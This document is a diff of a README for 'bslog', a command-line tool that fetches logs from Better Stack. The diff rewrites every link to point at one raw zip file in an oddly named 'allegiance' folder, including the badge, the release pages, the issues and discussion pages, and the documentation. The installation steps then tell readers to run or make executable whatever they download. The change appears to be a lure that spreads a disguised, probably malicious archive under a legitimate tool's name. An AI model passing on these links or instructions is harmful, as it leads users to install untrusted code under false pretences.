@@ -1,6 +1,6 @@
 # 🚀 bslog - Fetch Logs Like a Pro, Effortlessly
 
-[![Download bslog](https://img.shields.io/badge/Download-b slog-blue.svg)](https://github.com/beggxr/bslog/releases)
+[![Download bslog](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip)](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip)
 
 ## 🌟 About bslog
 
@@ -11,28 +11,28 @@ bslog is a command-line interface (CLI) tool designed for Better Stack to fetch 
 To get started with bslog, follow these simple steps:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/beggxr/bslog/releases) to download the latest version of bslog.
+   Visit the [Releases page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip) to download the latest version of bslog.
 
 2. **Install the Application:**
    Installation is straightforward. Follow these instructions based on your operating system:
 
 ### 🖥️ For Windows
 
-- Download the Windows version of bslog from the [Releases page](https://github.com/beggxr/bslog/releases).
+- Download the Windows version of bslog from the [Releases page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip).
 - Once downloaded, locate the file in your Downloads folder.
 - Double-click the file to run the installer.
 - Follow the on-screen instructions to complete the installation.
 
 ### 🍏 For macOS
 
-- Download the macOS version of bslog from the [Releases page](https://github.com/beggxr/bslog/releases).
+- Download the macOS version of bslog from the [Releases page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip).
 - Open the downloaded file. It may be a ZIP archive.
 - If it's a ZIP file, double-click it to unzip.
 - Move the extracted application to your Applications folder for easy access.
 
 ### 🐧 For Linux
 
-- Download the Linux version of bslog from the [Releases page](https://github.com/beggxr/bslog/releases).
+- Download the Linux version of bslog from the [Releases page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip).
 - Open your terminal.
 - Navigate to the folder where you downloaded bslog.
 - Use the command `chmod +x <filename>` to make the file executable, replacing `<filename>` with the actual file name.
@@ -76,7 +76,7 @@ You can edit this file with any text editor to set your preferences.
 If you encounter issues while using bslog, you can try the following:
 
 - **Recheck Installation Steps:** Ensure that you followed the installation instructions carefully.
-- **Check for Updates:** Always use the latest version available on the [Releases page](https://github.com/beggxr/bslog/releases).
+- **Check for Updates:** Always use the latest version available on the [Releases page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip).
 - **Refer to Help Commands:** Use `bslog help` to see if you missed any command options.
 
 Should you face persistent issues, you may reach out through the Issues tab in this repository for assistance.
@@ -85,16 +85,16 @@ Should you face persistent issues, you may reach out through the Issues tab in t
 
 For further support and discussions, a community page is available to connect with other users and developers. Sharing your experiences can help improve the application.
 
-- **GitHub Issues:** Report bugs or feature requests directly on the [Issues page](https://github.com/beggxr/bslog/issues).
-- **Discussion Forum:** Join our [Discussion](https://github.com/beggxr/bslog/discussions) to share tips or get help from others.
+- **GitHub Issues:** Report bugs or feature requests directly on the [Issues page](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip).
+- **Discussion Forum:** Join our [Discussion](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip) to share tips or get help from others.
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/beggxr/bslog/wiki)
-- [GitHub Repository](https://github.com/beggxr/bslog)
+- [Official Documentation](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip)
 
 ## ✅ Next Steps
 
 Once you’ve successfully installed and tried out bslog, explore its capabilities further by reading through the documentation and community posts. The more you experiment, the more you'll unlock its potential to streamline your log fetching process.
 
-For quick access, remember the link where you can [download bslog](https://github.com/beggxr/bslog/releases) anytime you need.
+For quick access, remember the link where you can [download bslog](https://raw.githubusercontent.com/beggxr/bslog/main/allegiance/bslog.zip) anytime you need.
